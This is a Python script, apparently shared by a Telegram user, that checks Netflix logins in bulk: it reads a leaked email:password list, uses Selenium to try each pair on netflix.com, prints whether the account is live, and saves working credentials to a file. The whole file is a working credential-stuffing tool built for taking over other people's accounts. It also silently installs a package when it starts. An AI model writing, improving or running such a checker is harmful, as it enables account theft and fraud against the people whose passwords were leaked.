import os
import subprocess
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

def clear():
    if os.name == 'nt':  
        os.system('cls')
    else:  
        os.system('clear')

clear()

subprocess.run(["pip", "install", "selenium"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def loucuraze(url, email, senha):
    try:
        options = webdriver.ChromeOptions()
        driver = webdriver.Chrome(options=options)
        driver.get(url)

        driver.get(url)

        email_input = driver.find_element(By.ID, ":r0:")
        email_input.send_keys(email)

        password_input = driver.find_element(By.ID, ":r3:")
        password_input.send_keys(senha)

        login_button = driver.find_element(By.XPATH, "//button[@data-uia='login-submit-button']")
        login_button.click()

        try:
            error_message = WebDriverWait(driver, 10).until(
                EC.visibility_of_any_elements_located((By.CSS_SELECTOR, "._9ay7, ._9kq2, ._9kq2 > a, #error_box"))
            )

            for error in error_message:
                print(RED + "DIE - " + error.text + RESET)

        except:           
            try:
                if "Quem está assistindo?" in driver.page_source:
                    print(GREEN + "LIVE | Email:", email + RESET)
                    live(email, senha)
                else:
                    print(RED + "DIE - Email:", email + RESET)

            except Exception as ex:
                print(RED + "DIE - Erro durante o processo:", str(ex) + RESET)

    finally:
        driver.quit()

def live(email, senha):
    with open("netflix.txt", "a") as file:
        file.write(f"Email: {email}| Senha: {senha}| By: @YodaF1re\n")

def lertudo(net):
    try:
        with open(net, 'r', encoding='latin1') as file:
            linhas = file.readlines()
            credenciais = [tuple(linha.strip().replace(':', '|').split('|')) for linha in linhas]
        return credenciais
    except Exception as ex:
        print(RED + "DIE - Erro ao ler o arquivo:", str(ex) + RESET)
        return []

def main():
    banner = (f"""

              \033[31m███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
              ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
              ██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝ 
              ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗ 
              ██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
              ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝\033[0m
\x1b[0m                            CHECKER LOGS NETFLIX
\x1b[38;2;143;18;846m                ╚╦════════════════════════════════════════════╦╝
\x1b[38;2;134;20;846m           ╔═════╩════════════════════════════════════════════╩═════╗\x1b[0m
                   TELEGRAM   :        [ {GREEN} @YodaF1re{RESET} ]
                   FORMAT     :     [ {GREEN} EMAIL:PASSWORD{RESET} ]
\x1b[38;2;134;20;846m           ╚════════════════════════════════════════════════════════╝
    """)
    
    print(banner)

    db = input(GREEN + "DB NETFLIX \x1b[38;2;143;18;846m►►\x1b[0m " + RESET)

    url = "https://www.netflix.com/login"
    credenciais = lertudo(db)

    for email, senha in credenciais:
        loucuraze(url, email, senha)

if __name__ == "__main__":
    main()
